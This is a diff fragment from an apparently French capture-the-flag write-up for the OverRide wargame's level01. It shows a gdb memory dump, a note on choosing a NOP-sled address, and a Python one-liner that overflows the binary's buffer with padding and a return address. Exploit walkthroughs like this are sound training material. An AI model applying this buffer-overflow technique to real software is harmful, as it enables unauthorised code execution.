@@ -81,10 +81,9 @@ Breakpoint 1, 0x080484d5 in main ()
 0xffffd930:	0x20343430	0x32343234	0x48535300	0x5954545f
 0xffffd940:	0x65642f3d	0x74702f76	0x00302f73	0x52455355
 0xffffd950:	0x76656c3d	0x31306c65	0x5f534c00	0x4f4c4f43
----Type <return> to continue, or q <return> to quit---q
-Quit
-(gdb) quit
-
+```
+Dans cette liste d'hexa on va chercher nos NOP (0x90 en hexa) et prendre une adresse à peu près au milieu. (0xffffd8d0)
+```
 level01@OverRide:~$ (python -c 'print "dat_wil\n" + "B" * 80 + "\xd0\xd8\xff\xff"'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
